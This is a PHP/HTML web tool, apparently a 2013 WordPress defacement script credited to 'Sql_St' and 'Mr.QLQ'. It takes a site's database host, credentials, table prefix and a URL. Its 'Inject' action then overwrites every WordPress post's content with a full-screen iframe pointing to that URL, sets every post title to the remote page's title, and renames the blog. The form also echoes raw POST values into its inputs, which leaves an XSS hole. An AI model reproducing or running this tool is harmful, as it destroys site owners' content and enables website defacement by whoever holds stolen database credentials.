<head>
<meta name="description" content="Change Index Wordpress Security">
<title>Change Index Wordpress Security</title>
</head>

<p align="center"><font color="#008000">Change Index </font>
<font color="#008080">Wordpress</font></p>
<p>&nbsp;</p>
<div style="position: absolute; width: 430px; height: 142px; z-index: 1; left: 319px; top: 101px" id="layer1">
	<p dir="rtl" align="center"><font color="#000080">Place the database 
	information and then place a link file Index </font>
	<p dir="rtl" align="center"><font color="#000080">Experimental version did not 
	try on all copy </font>
	<p dir="rtl" align="center"><font color="#000080">Programming in the Hands of Arab</font></div>

<form method="POST">
localhost&nbsp;&nbsp; : 
<input type="text" name="localhost" value="<?=(isset($_POST['localhost'])) ? $_POST['localhost'] : "localhost";?>"><Br />
username&nbsp; : <input type="text" name="username" value="<?=$_POST['username'];?>"><Br />
dbname&nbsp;&nbsp;&nbsp; : <input type="text" name="dbname" value="<?=$_POST['dbname'];?>" ><Br />
password : <input type="text" name="password" value="<?=$_POST['password'];?>" ><Br />
prefix&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : <input type="text" name="prefix" value="<?=$_POST['prefix'];?>" ><Br />
url index&nbsp;&nbsp;  : <input type="text" name="index" value="<?=$_POST['index'];?>" ><Br />

<input type="submit" name="Inject" value="Inject">
</form>
<p align="center"><font color="#3399FF">Idea :
<a style="text-decoration: none" href="skype:sqlsat.iraq"><font color="#3399FF">Sql_St</font></a> 
::: Development : <a style="text-decoration: none" href="skype:y7c@hotmail.com ">
<font color="#3399FF">Mr.QLQ </font></a>
</font></p>
<p align="center"><font color="#800000">Version 1.0 Beta ©2013</font></p>
<?php

if(!isset($_POST['Inject'])){die;}

$localhost = $_POST['localhost'];
$username = $_POST['username'];
$password = $_POST['password'];
$dbname = $_POST['dbname'];
$prefix = $_POST['prefix'];
$index = $_POST['index'];

if(!isset($localhost)){die("localhost empty");}
if(!isset($username)){die("username empty");}
if(!isset($password)){die("password empty");}
if(!isset($dbname)){die("dbname empty");}
if(!isset($prefix)){die("prefix empty");}
if(!isset($index)){die("index empty");}


$mysql_connect = mysql_connect($localhost,$username,$password);
mysql_select_DB($dbname);
$code = mysql_real_escape_string('<iframe src="'.$index.'" style="position:fixed; z-index:9999; top:0; bottom:0; width:100%; height:100%; right:0; left:0; background:#fff; " frameborder="0"></iframe>');
preg_match("/<title>(.*?)<\/title>/i",file_get_contents($index),$title);

$query_inject_index = mysql_query("update `".$prefix."posts` set `post_content`='$code' , `post_title`='$title[1]'");
$query_inject_title = mysql_query("update `".$prefix."options` set `option_value`='$title[1]' ,`blogdescription`='' where `option_name`='blogname'");

if(($query_inject_index) or ($query_inject_title)){echo "Injected";}else{echo "Error";}

mysql_close($mysql_connect);
?>